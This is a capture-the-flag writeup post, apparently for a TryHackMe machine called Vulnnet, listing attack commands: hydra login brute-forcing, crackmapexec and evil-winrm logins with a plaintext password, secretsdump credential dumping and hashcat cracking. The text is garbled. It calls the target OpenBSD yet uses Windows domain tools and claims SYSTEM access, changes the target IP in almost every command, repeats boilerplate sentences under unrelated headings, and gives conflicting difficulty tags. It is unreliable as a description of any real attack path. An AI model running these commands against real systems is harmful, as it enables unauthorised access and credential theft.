---
TitleSEO: "TryHackMe — Vulnnet (Insane OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Vulnnet (Insane OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Vulnnet. NTLM Relay and Local File Inclusion to achieve insane compromise on OpenBSD."
Keywords: "tryhackme, insane, medium, hard, ctf, active directory"
URL: "https://zurefx.github.io/writeups/htb-vulnnet-227.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-vulnnet-227/"
Date: "2026-02-26"
Tags: "TryHackMe, Insane, Medium, Hard, CTF, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-vulnnet-227"
Permalink: "/writeups/htb-vulnnet-227.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Vulnnet** is rated **Insane** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.64.230.253`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p1433,1433,587 10.102.224.166 -oN scan.txt
```

The web application was vulnerable to Server-Side Template Injection (SSTI). Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.22.37.233/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.130.20 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
nmap -sCV -p22,995,23 10.105.189.200 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

Key finding: **Local File Inclusion**.

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

### Initial Access

The database credentials were hardcoded in the application source code. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.38.72.94 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.124.95.211 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.107.98.156 -u administrator -p 'P@ssw0rd!'
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.206.218/FUZZ
crackmapexec smb 10.85.216.210 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.57.35
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.41.249
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Summary

### Tools Used

- `lookupsid`
- `kerbrute`
- `atexec`
- `secretsdump`
- `feroxbuster`
- `chisel`
- `ffuf`

### Key Takeaways

- NTLM Relay
- Local File Inclusion
- Remote File Inclusion
